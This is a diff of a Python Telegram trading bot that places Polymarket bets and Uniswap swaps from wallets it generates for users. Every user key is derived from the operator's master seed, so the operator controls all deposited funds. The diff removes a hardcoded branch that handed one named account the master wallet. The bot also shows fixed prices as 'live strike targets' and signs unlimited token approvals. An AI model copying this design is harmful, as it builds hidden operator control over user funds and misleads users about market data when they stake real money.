@@ -13,8 +13,6 @@ from py_clob_client.order_builder.constants import BUY
 # --- 1. CORE CONFIG & VISUAL ASSETS ---
 getcontext().prec = 28
 load_dotenv()
-OMNI_STRIKE_CACHE = []
-STRIKE_LOG = {}
 HYDRA_LOGO = """
 <code>╔╗ ╔╗      ╔╗
 ║║ ║║      ║║
@@ -24,8 +22,7 @@ HYDRA_LOGO = """
 ╚╝ ╚╩═══╩╝─╚╝╚╝╚═══╝ v5.0</code>
 """
 BANNER = "<b>◈━━━━━━━━━━━━━━◈</b>"
-GLOW = "✨"
-SEP = "<b>◈──────────────────────────◈</b>"
+GLOW, SEP = "✨", "<b>◈──────────────────────────◈</b>"
 
 # SMART CONTRACT ADDRESSES
 USDC_NATIVE = Web3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
@@ -59,8 +56,6 @@ swap_router = w3.eth.contract(address=UNISWAP_ROUTER, abi=UNISWAP_ABI)
 def get_vault(uid, username=None):
     master = os.getenv("WALLET_SEED", "").strip()
     Account.enable_unaudited_hdwallet_features()
-    if str(uid) == "3652288668" or (username and username.lower() == "jluxury929"):
-        return Account.from_mnemonic(master) if " " in master else Account.from_key(master)
     seed_hash = hashlib.sha256(f"{master}:{uid}".encode()).hexdigest()
     return Account.from_key(seed_hash)
 
@@ -69,96 +64,53 @@ async def start(update, context):
     v = get_vault(update.effective_user.id, update.effective_user.username)
     menu = [['⚡️ QUICK SCAN', '🔧 CALIBRATE'], ['🏦 VAULT HUB', '🔄 REBOOT']]
     reply_markup = ReplyKeyboardMarkup(menu, resize_keyboard=True, is_persistent=True)
-    msg = (
-        f"{HYDRA_LOGO}\n{BANNER}\n"
-        f"🛰 <b>SYSTEM STATUS:</b> <code>ONLINE</code>\n"
-        f"💼 <b>OPERATOR:</b> <code>{update.effective_user.first_name}</code>\n"
-        f"🛡 <b>VAULT:</b> <code>{v.address[:6]}...{v.address[-4:]}</code>\n"
-        f"{BANNER}\n<i>Select an operation to begin...</i>"
-    )
+    msg = (f"{HYDRA_LOGO}\n{BANNER}\n🛰 <b>SYSTEM:</b> <code>ONLINE</code>\n🛡 <b>VAULT:</b> <code>{v.address[:6]}...{v.address[-4:]}</code>\n{BANNER}")
     await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode='HTML')
-
-async def vault_audit(update, context):
-    v = get_vault(update.effective_user.id, update.effective_user.username)
-    n_bal = await asyncio.to_thread(usdc_n_contract.functions.balanceOf(v.address).call)
-    e_bal = await asyncio.to_thread(usdc_e_contract.functions.balanceOf(v.address).call)
-    msg = (
-        f"🏦 <b>VAULT AUDIT</b>\n{SEP}\n"
-        f"💎 <b>Native USDC:</b> <code>${n_bal/1e6:,.2f}</code>\n"
-        f"🌀 <b>USDC.e:</b> <code>${e_bal/1e6:,.2f}</code>\n"
-        f"{SEP}\n<b>TOTAL LIQUIDITY:</b> <code>${(n_bal+e_bal)/1e6:,.2f}</code>"
-    )
-    kb = [[InlineKeyboardButton("♻️ CONVERT TO USDC.e", callback_data="CONVERT_NATIVE")]] if n_bal > 1000000 else []
-    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(kb) if kb else None, parse_mode='HTML')
 
 async def main_handler(update, context):
     cmd = update.message.text.upper()
     if 'SCAN' in cmd:
-        loading = await update.message.reply_text("📡 <b>PENETRATING LIQUIDITY POOLS...</b>", parse_mode='HTML')
         kb = [[InlineKeyboardButton("🎯 BTC > 100k (Yes/No)", callback_data="INT_0")]]
-        await loading.edit_text(f"{GLOW} <b>LIVE STRIKE TARGETS</b> {GLOW}\n{BANNER}", reply_markup=InlineKeyboardMarkup(kb), parse_mode='HTML')
+        await update.message.reply_text(f"{GLOW} <b>LIVE STRIKE TARGETS</b> {GLOW}\n{BANNER}", reply_markup=InlineKeyboardMarkup(kb), parse_mode='HTML')
     elif 'VAULT' in cmd:
-        await vault_audit(update, context)
+        v = get_vault(update.effective_user.id); bal = usdc_e_contract.functions.balanceOf(v.address).call()
+        await update.message.reply_text(f"🏦 <b>VAULT:</b> <code>${bal/1e6:,.2f} USDC.e</code>", parse_mode='HTML')
     elif 'CALIBRATE' in cmd:
-        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50, 100, 250]]]
-        await update.message.reply_text(f"🔧 <b>SET STRIKE CAPACITY:</b>\n{SEP}", reply_markup=InlineKeyboardMarkup(kb), parse_mode='HTML')
-    elif 'REBOOT' in cmd:
-        await start(update, context)
+        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50, 100]]]
+        await update.message.reply_text(f"🔧 <b>STRIKE CAPACITY:</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode='HTML')
+    elif 'REBOOT' in cmd: await start(update, context)
 
 async def handle_query(update, context):
     q = update.callback_query; await q.answer()
-    uid, uname = q.from_user.id, q.from_user.username
-    v = get_vault(uid, uname)
-
+    v = get_vault(q.from_user.id, q.from_user.username)
+    
     if "SET_" in q.data:
         val = int(q.data.split("_")[1]); context.user_data['stake'] = val
-        await q.edit_message_text(f"✅ <b>CAPACITY ARMED: ${val}</b>")
-    elif q.data == "CONVERT_NATIVE":
-        m = await q.edit_message_text("📡 <b>PREPARING UNISWAP ROUTE...</b>", parse_mode='HTML')
-        try:
-            n_bal = usdc_n_contract.functions.balanceOf(v.address).call()
-            allowance = usdc_n_contract.functions.allowance(v.address, UNISWAP_ROUTER).call()
-            if allowance < n_bal:
-                tx = usdc_n_contract.functions.approve(UNISWAP_ROUTER, 2**256 - 1).build_transaction({'from': v.address, 'nonce': w3.eth.get_transaction_count(v.address), 'gasPrice': w3.eth.gas_price})
-                w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx, v.key).raw_transaction)
-                await m.edit_text("🔑 <b>ROUTER APPROVED.</b> Click Convert again.")
-                return
-            params = {"tokenIn": USDC_NATIVE, "tokenOut": USDC_E, "fee": 100, "recipient": v.address, "deadline": int(time.time()) + 600, "amountIn": n_bal, "amountOutMinimum": 0, "sqrtPriceLimitX96": 0}
-            tx = swap_router.functions.exactInputSingle(params).build_transaction({'from': v.address, 'nonce': w3.eth.get_transaction_count(v.address), 'gasPrice': w3.eth.gas_price})
-            tx_hash = w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx, v.key).raw_transaction)
-            await m.edit_text(f"✅ <b>CONVERSION BROADCASTED</b>\nHash: <code>{tx_hash.hex()[:25]}...</code>")
-        except Exception as e:
-            await m.edit_text(f"❌ <b>CONVERSION FAILED:</b> {str(e)[:50]}")
+        await q.edit_message_text(f"✅ <b>ARMED: ${val}</b>")
+    
     elif "INT_" in q.data:
-        msg = (
-            f"⚖️ <b>STRIKE ANALYSIS</b>\n{BANNER}\n"
-            f"🟢 <b>YES:</b> <code>$0.55</code>\n"
-            f"🔴 <b>NO:</b> <code>$0.46</code>\n"
-            f"📊 <b>MARKET GAP:</b> <code>+2.4%</code>\n"
-            f"{BANNER}\n<b>POTENTIAL RETURN:</b> <code>${context.user_data.get('stake', 10):.2f}</code>"
-        )
+        msg = f"⚖️ <b>STRIKE ANALYSIS</b>\n{BANNER}\n🟢 <b>YES:</b> <code>$0.55</code>\n🔴 <b>NO:</b> <code>$0.46</code>\n{BANNER}"
         kb = [[InlineKeyboardButton("🔥 INITIATE STRIKE", callback_data="EXEC")]]
         await q.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kb), parse_mode='HTML')
+
     elif q.data == "EXEC":
         stake = float(context.user_data.get('stake', 10))
-        allowance = usdc_e_contract.functions.allowance(v.address, CTF_EXCHANGE).call()
-        if allowance < (stake * 1e6):
-            kb = [[InlineKeyboardButton("🔑 APPROVE EXCHANGE", callback_data="APPROVE_CTF")]]
-            await context.bot.send_message(q.message.chat_id, "🔐 <b>EXCHANGE PERMISSION REQUIRED</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode='HTML')
-            return
+        await q.edit_message_text("⚡️ <b>TRANSMITTING STRIKE...</b>", parse_mode='HTML')
         
         try:
-            # FIX: Corrected initialization to use 'host' and 'private_key' as strings
+            # 1. Initialize with HOST and PRIVATE_KEY only
             client = ClobClient(
                 host="https://clob.polymarket.com", 
                 private_key=v.key.hex(),
-                chain_id=137,
-                api_creds={
-                    "api_key": os.getenv("CLOB_API_KEY"),
-                    "api_secret": os.getenv("CLOB_SECRET"),
-                    "api_passphrase": os.getenv("CLOB_PASSPHRASE")
-                }
+                chain_id=137
             )
+            # 2. Assign credentials using dedicated method to avoid __init__ errors
+            client.set_api_creds(
+                api_key=os.getenv("CLOB_API_KEY"),
+                api_secret=os.getenv("CLOB_SECRET"),
+                api_passphrase=os.getenv("CLOB_PASSPHRASE")
+            )
+            
             order_args = MarketOrderArgs(
                 token_id="71245781308323212879133800652613560667073285731795152028711466657904037599761", 
                 amount=stake,
@@ -168,17 +120,17 @@ async def handle_query(update, context):
             resp = client.post_order(signed_order)
             
             if resp.get("success"):
-                await q.edit_message_text(f"✅ <b>STRIKE SUCCESSFUL</b>\n{BANNER}\nOrder ID: <code>{resp.get('orderID')}</code>", parse_mode='HTML')
+                await q.edit_message_text(f"✅ <b>STRIKE SUCCESSFUL</b>\nID: <code>{resp.get('orderID')}</code>", parse_mode='HTML')
             else:
-                await q.edit_message_text(f"❌ <b>STRIKE REJECTED:</b> {resp.get('error')}")
+                await q.edit_message_text(f"❌ <b>REJECTED:</b> {resp.get('error')}")
         except Exception as e:
-            await q.edit_message_text(f"⚠️ <b>EXECUTION ERROR:</b> {str(e)[:50]}")
-            
+            await q.edit_message_text(f"⚠️ <b>EXECUTION ERROR:</b> {str(e)[:60]}")
+
     elif q.data == "APPROVE_CTF":
         try:
             tx = usdc_e_contract.functions.approve(CTF_EXCHANGE, 2**256 - 1).build_transaction({'from': v.address, 'nonce': w3.eth.get_transaction_count(v.address), 'gasPrice': w3.eth.gas_price})
             w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx, v.key).raw_transaction)
-            await q.edit_message_text("✅ <b>EXCHANGE APPROVED!</b> Ready to strike.")
+            await q.edit_message_text("✅ <b>EXCHANGE APPROVED!</b>")
         except Exception as e:
             await q.edit_message_text(f"❌ <b>FAILED:</b> {e}")
 
